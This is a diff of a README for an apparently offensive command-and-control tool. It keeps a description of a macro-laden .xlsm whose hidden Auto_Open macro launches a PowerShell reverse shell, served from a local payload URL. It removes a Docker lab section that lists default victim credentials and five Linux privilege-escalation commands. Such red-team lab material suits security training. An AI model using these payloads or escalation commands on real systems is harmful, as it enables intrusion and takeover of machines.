@@ -13,8 +13,6 @@
   <span> • </span>
   <a href="#usage">Usage</a>
   <span> • </span>
-  <a href="#docker-lab">Docker Lab</a>
-  <span> • </span>
   <a href="#payload-generation">Payloads</a>
   <p></p>
 </div>
@@ -141,34 +139,6 @@ http://192.168.1.10:9090/payloads/payload.xlsm
 
 The `.xlsm` uses Excel 4.0 (XLM) macros hidden in a `veryHidden` sheet.
 Opening the file triggers `Auto_Open` → PowerShell reverse shell.
-
----
-
-## Docker Lab
-
-A pre-built lab with an attacker container (Haturaya C2) and a victim Ubuntu 22.04 container with intentional misconfigurations.
-
-```bash
-bash ./lab.sh start     # build images + start containers
-bash ./lab.sh c2        # interactive TUI in attacker container
-bash ./lab.sh victim    # root shell in victim container
-bash ./lab.sh ssh       # SSH as user into victim (port 2222)
-bash ./lab.sh payloads  # show one-liner payloads for the lab
-bash ./lab.sh privesc   # show privesc hints
-bash ./lab.sh stop      # tear down
-```
-
-**Victim credentials**: `user` / `password` · `root` / `toor`
-
-### 5 Privesc Paths
-
-| # | Technique | Command |
-|---|-----------|---------|
-| 1 | Sudo vim escape | `sudo vim -c ':!/bin/bash'` |
-| 2 | SUID find | `find . -exec /bin/bash -p \; -quit` |
-| 3 | Writable root cron | append shell to `/opt/scripts/heartbeat.sh` |
-| 4 | Readable shadow backup | `cat /var/backups/shadow.bak` → crack with john |
-| 5 | SUID PATH hijack | `echo '/bin/bash -p' > /tmp/ps && PATH=/tmp:$PATH /usr/local/bin/vuln_app` |
 
 ---
 
